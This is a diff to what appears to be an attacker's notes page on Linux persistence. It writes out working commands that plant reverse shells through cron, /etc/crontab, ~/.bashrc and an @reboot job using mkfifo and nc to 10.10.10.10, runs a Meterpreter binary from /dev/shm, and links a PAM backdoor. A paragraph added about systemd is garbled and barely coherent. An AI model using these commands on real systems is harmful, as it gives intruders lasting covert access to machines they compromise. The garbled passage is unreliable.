@@ -77,16 +77,17 @@ session.name
 ```
 
 #### Cron
+
+Some reference mentioned need for newlines, I have found that it is not always the case
 ```bash
 # newlines required
 CT="\n1 * * * *   root    ./dev/shm/met.elf\n"
 printf "$CT" | crontab -
-
 ```
 
-As a one-liner
+As a one-liner (probably newlines do not matter)
 ```bash
-echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+root> echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" | tee - a/etc/crontab
 ```
 
 Serve shell script, for example:
@@ -98,7 +99,7 @@ bash -i >& /dev/tcp/ip/port 0>&1
 ```bash
 echo 'bash -i >& /dev/tcp/$ip/$port 0>&1' >> ~/.bashrc
 ```
-OR pam_unix.so [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
+OR `pam_unix.so` [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
 
 ```bash
 # Variable just for easy reading.
@@ -106,7 +107,9 @@ REVSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337
 (crontab -l ; echo "@reboot sleep 200 && $REVSHELL")|crontab 2> /dev/null
 ```
 
-#### Systemd
+#### `systemd`
+
+[[Systemd]] is sytemd'ees-nuts for many *potential* reasons (that I probably cannot verify and ) it is pretty controversial in number of subgroups, distributions, etc. [[Sytemd-Controversy]], like any to neutrality and to aid in not have to remember and lookup why X ?(maybe)=Y see that page
 
 [From this article Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)
 ```bash
